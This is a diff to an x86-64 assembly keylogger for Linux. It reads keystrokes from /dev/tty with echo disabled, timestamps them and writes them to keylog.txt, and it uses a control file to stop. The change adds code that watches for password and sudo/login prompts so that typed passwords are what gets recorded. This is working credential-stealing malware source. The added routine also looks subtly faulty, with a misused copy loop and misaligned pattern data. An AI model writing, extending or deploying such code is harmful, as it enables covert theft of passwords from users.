@@ -1,66 +1,64 @@
 section .data
     fname db "keylog.txt", 0
-    tty_path db "/dev/tty", 0   
-    ctrl_file db "k.ctrl", 0     
-    fd dq 0                    
-    tty_fd dq 0                
-    ctrl_fd dq 0               
-    tbuf db 64 dup(0)          
-    nl db 0xa                  
-    s db " | ", 0              
-    dpid dq 0                  
+    tty_path db "/dev/tty", 0
+    ctrl_file db "k.ctrl", 0
+    fd dq 0
+    tty_fd dq 0
+    ctrl_fd dq 0
+    tbuf db 64 dup(0)
+    nl db 0xa
+    s db " | ", 0
+    dpid dq 0
+    detecting_password db 0
 
 section .bss
-    buf resb 1                 
-    tspec resq 2               
-    termios resb 60           ; struct termios
+    buf resb 1
+    tspec resq 2
+    termios resb 60
+    last_chars resb 10
 
 section .text
 global _start
 
 _start:
-    mov rax, 57           
+    mov rax, 57
     syscall
-    
+
     cmp rax, 0
-    je child              
-    mov [dpid], rax      
-    jmp parent           
+    je child
+    mov [dpid], rax
+    jmp parent
 
 child:
-    ; ouvre log
-    mov rax, 2            
+    mov rax, 2
     mov rdi, fname
-    mov rsi, 102o        
-    mov rdx, 0644o       
+    mov rsi, 102o
+    mov rdx, 0644o
     syscall
     mov [fd], rax
 
-    ; ouvre tty
     mov rax, 2
     mov rdi, tty_path
-    mov rsi, 2           ; read-write
+    mov rsi, 2
     mov rdx, 0
     syscall
     mov [tty_fd], rax
 
-    ; get term settings
-    mov rax, 16          ; tcgetattr
+    mov rax, 16
     mov rdi, [tty_fd]
     mov rsi, termios
     syscall
 
-    ; desactive echo et canonical mode
-    mov byte [termios+3], 0   ; c_lflag &= ~(ECHO | ICANON)
+    mov byte [termios+3], 0
+    mov byte [termios+6], 1
+    mov byte [termios+7], 0
 
-    ; set term settings
-    mov rax, 16          ; tcsetattr (TCSANOW)
+    mov rax, 16
     mov rdi, [tty_fd]
-    mov rsi, 2           ; TCSAFLUSH
+    mov rsi, 2
     mov rdx, termios
     syscall
 
-    ; init ctrl       
     mov rax, 2
     mov rdi, ctrl_file
     mov rsi, 102o
@@ -69,70 +67,61 @@ child:
     mov [ctrl_fd], rax
 
 loop:
-    ; verif ctrl
-    mov rax, 3            
-    mov rdi, [ctrl_fd]
-    syscall
-
-    mov rax, 2            
-    mov rdi, ctrl_file
-    mov rsi, 0            
-    mov rdx, 0644o
-    syscall
-    mov [ctrl_fd], rax
-
     mov rax, 0
     mov rdi, [ctrl_fd]
     mov rsi, buf
     mov rdx, 1
     syscall
 
-    cmp rax, 1           
+    cmp rax, 1
     je exit
 
-    ; get time
-    mov rax, 228         
-    mov rdi, 0           
+    mov rax, 228
+    mov rdi, 0
     mov rsi, tspec
     syscall
 
-    ; lecture touche
-    mov rax, 0                
-    mov rdi, [tty_fd]                
+    mov byte [buf], 0
+    mov rax, 0
+    mov rdi, [tty_fd]
     mov rsi, buf
-    mov rdx, 1                
+    mov rdx, 1
     syscall
 
-    cmp rax, 0
-    jle loop
+    cmp rax, 1
+    jne loop
 
-    ; converti temps
+    mov rsi, last_chars
+    mov rcx, 9
+    rep movsb
+    mov [last_chars+9], al
+
+    call check_password_prompt
+    cmp byte [detecting_password], 1
+    jne loop
+
     mov rax, [tspec]
     mov rdi, tbuf
     call ft
 
-    ; ecrit temps
-    mov rax, 1                
+    mov rax, 1
     mov rdi, [fd]
     mov rsi, tbuf
-    mov rdx, 20              
+    mov rdx, 20
     syscall
 
-    ; ecrit sep
     mov rax, 1
     mov rdi, [fd]
     mov rsi, s
     mov rdx, 3
     syscall
 
-    ; ecrit touche
-    mov rax, 1                
+    mov rax, 1
     mov rdi, [fd]
     mov rsi, buf
     mov rdx, 1
     syscall
 
-    ; retour
     mov rax, 1
     mov rdi, [fd]
     mov rsi, nl
@@ -142,30 +131,29 @@ loop:
     jmp loop
 
 parent:
-    mov rax, 2            
+    mov rax, 2
     mov rdi, ctrl_file
-    mov rsi, 102o        
-    mov rdx, 0644o       
+    mov rsi, 102o
+    mov rdx, 0644o
     syscall
 
-    mov rax, 60              
+    mov rax, 60
     xor rdi, rdi
     syscall
 
 exit:
-    ; restore term settings
-    mov byte [termios+3], 11  ; restore original c_lflag
-    mov rax, 16               ; tcsetattr
+    mov byte [termios+3], 11
+    mov rax, 16
     mov rdi, [tty_fd]
-    mov rsi, 2                ; TCSAFLUSH
+    mov rsi, 2
     mov rdx, termios
     syscall
 
-    mov rax, 3                
+    mov rax, 3
     mov rdi, [fd]
     syscall
 
-    mov rax, 3                
+    mov rax, 3
     mov rdi, [tty_fd]
     syscall
 
@@ -173,33 +161,68 @@ exit:
     mov rdi, [ctrl_fd]
     syscall
 
-    mov rax, 87               
+    mov rax, 87
     mov rdi, ctrl_file
     syscall
 
-    mov rax, 60               
+    mov rax, 60
     xor rdi, rdi
     syscall
+
+check_password_prompt:
+    mov rdi, last_chars
+    mov rsi, password_patterns
+    mov rcx, password_patterns_len
+
+.password_check_loop:
+    cmp rcx, 0
+    je .no_password
+
+    push rcx
+    push rdi
+    push rsi
+
+    mov rcx, 10
+    repe cmpsb
+    je .found_password
+
+    pop rsi
+    pop rdi
+    pop rcx
+    add rsi, 10
+    loop .password_check_loop
+
+.no_password:
+    mov byte [detecting_password], 0
+    ret
+
+.found_password:
+    mov byte [detecting_password], 1
+    ret
 
 ft:
     push rbx
     push rcx
-    
-    mov rbx, 10             
-    add rdi, 19             
-    mov byte [rdi], 0       
-    
-    mov rcx, 19            
-.l:
+
+    mov rbx, 10             ; Base 10
+    add rdi, 19             ; Place le pointeur à la fin du buffer
+    mov byte [rdi], 0       ; Ajoute le caractère de fin de chaîne
+
+    mov rcx, 19
+.convert_loop:
     dec rdi
     xor rdx, rdx
-    div rbx
-    add dl, '0'
-    mov [rdi], dl
+    div rbx                 ; Divise RAX par 10
+    add dl, '0'             ; Convertit en ASCII
+    mov [rdi], dl           ; Stocke le caractère
     dec rcx
     test rax, rax
-    jnz .l
-    
+    jnz .convert_loop       ; Continue tant que RAX != 0
+
     pop rcx
     pop rbx
     ret
+
+section .rodata
+password_patterns db "password:", "Passwd:", "Enter PW:", "sudo", "login:", "Password:"
+password_patterns_len equ 5
